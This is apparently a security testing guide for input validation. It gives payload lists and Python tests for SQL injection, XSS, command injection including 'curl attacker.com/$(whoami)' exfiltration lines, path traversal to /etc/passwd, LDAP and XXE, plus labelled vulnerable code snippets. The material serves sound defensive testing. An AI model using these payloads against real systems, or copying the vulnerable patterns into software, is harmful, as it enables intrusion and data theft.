# Input Validation Testing Guide

Comprehensive test cases for input validation and injection vulnerabilities.

## Input Validation Test Cases Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    INPUT VALIDATION TEST CASES                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  SQL INJECTION                                                      │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ Test Payloads:                                                │  │
│  │   ' OR '1'='1                                                 │  │
│  │   ' OR '1'='1' --                                             │  │
│  │   '; DROP TABLE users; --                                     │  │
│  │   ' UNION SELECT username, password FROM users --             │  │
│  │   1' AND SLEEP(5) --                                          │  │
│  │                                                               │  │
│  │ Test Locations:                                               │  │
│  │   □ URL parameters                                            │  │
│  │   □ POST body fields                                          │  │
│  │   □ HTTP headers (User-Agent, Referer)                        │  │
│  │   □ Cookies                                                   │  │
│  │   □ JSON fields                                               │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  CROSS-SITE SCRIPTING (XSS)                                         │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ Test Payloads:                                                │  │
│  │   <script>alert('XSS')</script>                               │  │
│  │   <img src=x onerror=alert('XSS')>                            │  │
│  │   javascript:alert('XSS')                                     │  │
│  │   <svg onload=alert('XSS')>                                   │  │
│  │   "><script>alert('XSS')</script>                             │  │
│  │                                                               │  │
│  │ Test Types:                                                   │  │
│  │   □ Reflected XSS (URL parameters)                            │  │
│  │   □ Stored XSS (user input stored and displayed)              │  │
│  │   □ DOM-based XSS (client-side JavaScript)                    │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  COMMAND INJECTION                                                  │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ Test Payloads:                                                │  │
│  │   ; ls -la                                                    │  │
│  │   | cat /etc/passwd                                           │  │
│  │   `whoami`                                                    │  │
│  │   $(id)                                                       │  │
│  │   && curl attacker.com/$(whoami)                              │  │
│  │                                                               │  │
│  │ Test Locations:                                               │  │
│  │   □ File names/paths                                          │  │
│  │   □ User input passed to system commands                      │  │
│  │   □ Image processing parameters                               │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  PATH TRAVERSAL                                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ Test Payloads:                                                │  │
│  │   ../../../etc/passwd                                         │  │
│  │   ....//....//....//etc/passwd                                │  │
│  │   ..%2f..%2f..%2fetc/passwd                                   │  │
│  │   ..%252f..%252f..%252fetc/passwd                             │  │
│  │                                                               │  │
│  │ Test Locations:                                               │  │
│  │   □ File download endpoints                                   │  │
│  │   □ File upload paths                                         │  │
│  │   □ Include/import parameters                                 │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## SQL Injection Testing

### Classic SQL Injection

**Authentication Bypass Payloads**:
```sql
-- Basic bypass
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
admin' --
admin' #

-- Boolean-based
' OR 'x'='x
' OR 1=1 LIMIT 1 --

-- Multiple statement termination
'; DROP TABLE users; --
```

**Test Script**:
```python
import requests

def test_sql_injection_auth_bypass():
    """Test SQL injection in authentication"""
    payloads = [
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "' OR 1=1 --",
    ]

    for payload in payloads:
        response = requests.post("/api/login", json={
            "username": payload,
            "password": "anything"
        })

        # Should not allow bypass
        assert response.status_code == 401, \
            f"SQL injection successful with payload: {payload}"

def test_sql_injection_search():
    """Test SQL injection in search parameters"""
    session = login("testuser", "password")

    payloads = [
        "'; DROP TABLE products; --",
        "' UNION SELECT username, password FROM users --",
        "' OR '1'='1",
    ]

    for payload in payloads:
        response = session.get("/api/search", params={
            "query": payload
        })

        # Should return 400 or sanitized results, not execute injection
        assert response.status_code in [200, 400]
        if response.status_code == 200:
            # Verify no suspicious data returned
            data = response.json()
            assert "password" not in str(data).lower()
```

### Union-Based SQL Injection

**Data Extraction Payloads**:
```sql
-- Extract data from other tables
' UNION SELECT username, password FROM users --
' UNION SELECT NULL, table_name FROM information_schema.tables --
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --

-- Determine column count
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  (error = too many columns)
```

**Test Script**:
```python
def test_union_sql_injection():
    """Test UNION-based SQL injection"""
    session = login("testuser", "password")

    # Try to extract user data
    response = session.get("/api/products", params={
        "id": "1' UNION SELECT username, password FROM users --"
    })

    assert response.status_code in [400, 404]
    if response.status_code == 200:
        # Should not return user table data in product response
        data = response.json()
        assert "username" not in str(data).lower()
        assert "password" not in str(data).lower()
```

### Blind SQL Injection

**Time-Based Blind Injection**:
```sql
-- MySQL
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --

-- PostgreSQL
' AND pg_sleep(5) --

-- SQL Server
'; WAITFOR DELAY '00:00:05' --

-- Oracle
' AND DBMS_LOCK.SLEEP(5) --
```

**Test Script**:
```python
import time

def test_blind_sql_injection():
    """Test time-based blind SQL injection"""
    session = login("testuser", "password")

    # Normal query should be fast
    start = time.time()
    response = session.get("/api/search", params={"query": "test"})
    normal_time = time.time() - start

    # Injection with SLEEP should take longer
    start = time.time()
    response = session.get("/api/search", params={
        "query": "' AND SLEEP(5) --"
    })
    injection_time = time.time() - start

    # Should not experience delay (injection blocked)
    assert injection_time < normal_time + 2, \
        "Time-based SQL injection successful"
```

### Second-Order SQL Injection

**Attack Scenario**: Injection payload stored, then executed later.

**Test Script**:
```python
def test_second_order_sql_injection():
    """Test second-order SQL injection"""
    session = login("testuser", "password")

    # Store malicious payload in user profile
    response = session.put("/api/profile", json={
        "bio": "'; DROP TABLE comments; --"
    })
    assert response.status_code == 200

    # Trigger second-order injection (bio used in query)
    response = session.get("/api/profile/public")
    assert response.status_code == 200

    # Verify comments table still exists
    response = session.get("/api/comments")
    assert response.status_code == 200  # Table not dropped
```

## Cross-Site Scripting (XSS) Testing

### Reflected XSS

**Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

**Test Script**:
```python
def test_reflected_xss():
    """Test reflected XSS in search parameter"""
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]

    for payload in payloads:
        response = requests.get("/search", params={
            "q": payload
        })

        html = response.text

        # Verify payload is escaped/encoded
        assert payload not in html, \
            f"Reflected XSS with payload: {payload}"

        # Check for proper encoding
        if "<script>" in payload:
            assert "&lt;script&gt;" in html or \
                   html.count("<script>") == 0

def test_xss_in_error_messages():
    """Test XSS in error messages"""
    response = requests.get("/api/user/<script>alert('XSS')</script>")

    html = response.text
    assert "<script>" not in html
```

### Stored XSS

**Attack Scenario**: Malicious script stored in database, executed when viewed by others.

**Test Script**:
```python
def test_stored_xss():
    """Test stored XSS in user comments"""
    session = login("attacker", "password")

    # Post comment with XSS payload
    xss_payload = "<script>alert('XSS')</script>"
    response = session.post("/api/comments", json={
        "text": xss_payload,
        "post_id": 1
    })
    assert response.status_code == 201

    # Victim views comments
    victim_session = login("victim", "password")
    response = victim_session.get("/api/posts/1")

    html = response.text

    # Verify payload is escaped
    assert xss_payload not in html
    assert "&lt;script&gt;" in html or \
           "<script>" not in html

def test_stored_xss_in_profile():
    """Test stored XSS in user profile"""
    session = login("testuser", "password")

    # Update profile with XSS payload
    response = session.put("/api/profile", json={
        "name": "<img src=x onerror=alert('XSS')>",
        "bio": "<svg onload=alert('XSS')>"
    })
    assert response.status_code == 200

    # View profile (should be escaped)
    response = session.get("/api/profile/public")
    html = response.text

    assert "<img src=x onerror=" not in html
    assert "<svg onload=" not in html
```

### DOM-Based XSS

**Vulnerable JavaScript Example**:
```javascript
// Vulnerable code
var query = location.search.substring(1);
document.getElementById('output').innerHTML = query;
```

**Test Script**:
```python
def test_dom_xss():
    """Test DOM-based XSS"""
    # XSS via URL fragment
    response = requests.get("/page.html#<img src=x onerror=alert('XSS')>")

    # Check that page doesn't directly render fragment
    html = response.text

    # Verify no direct innerHTML usage with user input
    assert "innerHTML = location" not in html
    assert "innerHTML = document.location" not in html

    # Check for proper sanitization functions
    assert "DOMPurify" in html or "sanitize" in html
```

## Command Injection Testing

### OS Command Injection

**Payloads**:
```bash
# Command chaining
; ls -la
& whoami
| cat /etc/passwd
|| id
&& curl attacker.com

# Command substitution
`whoami`
$(id)
${IFS}whoami

# Encoding bypass
;%20ls%20-la
;ls${IFS}-la
```

**Test Script**:
```python
def test_command_injection():
    """Test command injection in file processing"""
    session = login("testuser", "password")

    payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "&& curl attacker.com/$(whoami)",
    ]

    for payload in payloads:
        # Try to inject in filename parameter
        response = session.post("/api/process", json={
            "filename": f"test{payload}.txt"
        })

        # Should reject or sanitize input
        assert response.status_code in [400, 422], \
            f"Command injection possible with: {payload}"

def test_command_injection_image_processing():
    """Test command injection in image processing"""
    session = login("testuser", "password")

    # ImageMagick-style injection
    response = session.post("/api/resize", json={
        "url": "https://example.com/image.jpg\"; whoami; \""
    })

    assert response.status_code in [400, 422]
```

## Path Traversal Testing

### Directory Traversal

**Payloads**:
```
# Basic traversal
../../../etc/passwd
..\..\..\..\windows\system32\config\sam

# Double encoding
..%252f..%252f..%252fetc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd

# Unicode encoding
..%c0%af..%c0%af..%c0%afetc/passwd

# Null byte injection (older systems)
../../../etc/passwd%00
```

**Test Script**:
```python
def test_path_traversal_download():
    """Test path traversal in file download"""
    session = login("testuser", "password")

    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ]

    for payload in payloads:
        response = session.get("/api/download", params={
            "file": payload
        })

        # Should reject or sanitize
        assert response.status_code in [400, 403, 404], \
            f"Path traversal successful with: {payload}"

        # Verify not returning system files
        if response.status_code == 200:
            content = response.text
            assert "root:" not in content  # /etc/passwd content
            assert "Administrator" not in content  # Windows SAM

def test_path_traversal_upload():
    """Test path traversal in file upload"""
    session = login("testuser", "password")

    # Try to upload to parent directory
    files = {
        'file': ('../../evil.txt', b'malicious content', 'text/plain')
    }
    response = session.post("/api/upload", files=files)

    # Should sanitize filename
    assert response.status_code in [200, 400]

    # Verify file not written to parent directory
    if response.status_code == 200:
        uploaded_path = response.json().get("path", "")
        assert "../" not in uploaded_path
```

## LDAP Injection Testing

**Payloads**:
```
# Bypass authentication
*
*)(uid=*))(|(uid=*
admin)(&(password=*))

# Information disclosure
*)(objectClass=*)
*)(cn=*))(|(cn=*
```

**Test Script**:
```python
def test_ldap_injection():
    """Test LDAP injection in authentication"""
    payloads = [
        "*",
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
    ]

    for payload in payloads:
        response = requests.post("/api/ldap-login", json={
            "username": payload,
            "password": "anything"
        })

        assert response.status_code == 401, \
            f"LDAP injection successful with: {payload}"
```

## XML Injection Testing

### XML External Entity (XXE)

**Payloads**:
```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/api">
]>
<user><data>&xxe;</data></user>

<!-- Denial of Service -->
<!DOCTYPE lol [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<data>&lol2;</data>
```

**Test Script**:
```python
def test_xxe_file_disclosure():
    """Test XXE for file disclosure"""
    xxe_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <user><name>&xxe;</name></user>"""

    response = requests.post("/api/xml-import",
        data=xxe_payload,
        headers={"Content-Type": "application/xml"}
    )

    # Should disable external entities
    assert response.status_code in [400, 422]
    if response.status_code == 200:
        content = response.text
        assert "root:" not in content
```

## Input Validation Best Practices

### Allowlist vs Denylist

**Preferred: Allowlist**
```python
# Good: Allowlist validation
ALLOWED_FILE_EXTENSIONS = ['.jpg', '.png', '.gif']

def validate_filename(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_FILE_EXTENSIONS:
        raise ValueError("Invalid file type")
    return True

# Good: Allowlist for usernames
USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9_]{3,20}$')

def validate_username(username):
    if not USERNAME_PATTERN.match(username):
        raise ValueError("Invalid username format")
    return True
```

**Avoid: Denylist (incomplete)**
```python
# Bad: Denylist (can be bypassed)
BLOCKED_EXTENSIONS = ['.exe', '.bat', '.sh']

def validate_filename(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext in BLOCKED_EXTENSIONS:
        raise ValueError("Blocked file type")
    return True  # .cmd, .ps1, .vbs still allowed!
```

### Parameterized Queries

**Secure: Parameterized Queries**
```python
# Good: Parameterized query (prevents SQL injection)
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))
    return cursor.fetchone()

# Good: ORM (prevents SQL injection)
user = User.objects.get(id=user_id)
```

**Insecure: String Concatenation**
```python
# Bad: String concatenation (vulnerable to SQL injection)
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()
```

### Output Encoding

**Context-Appropriate Encoding**
```python
import html
import json
import urllib.parse

# HTML context
safe_html = html.escape(user_input)

# JavaScript context
safe_js = json.dumps(user_input)

# URL parameter context
safe_url = urllib.parse.quote(user_input)

# SQL context
safe_sql = "?"  # Use parameterized queries instead
```

### Content Security Policy (CSP)

**Recommended CSP Headers**:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
```

## Testing Checklist

- [ ] Test all input fields with injection payloads
- [ ] Test URL parameters, query strings, and path segments
- [ ] Test HTTP headers (User-Agent, Referer, etc.)
- [ ] Test file upload functionality
- [ ] Test API endpoints with different content types
- [ ] Test both GET and POST methods
- [ ] Test with authenticated and unauthenticated users
- [ ] Verify error messages don't leak information
- [ ] Check that input length limits are enforced
- [ ] Verify proper encoding/escaping in output
- [ ] Test with special characters and Unicode
- [ ] Test with null bytes and control characters
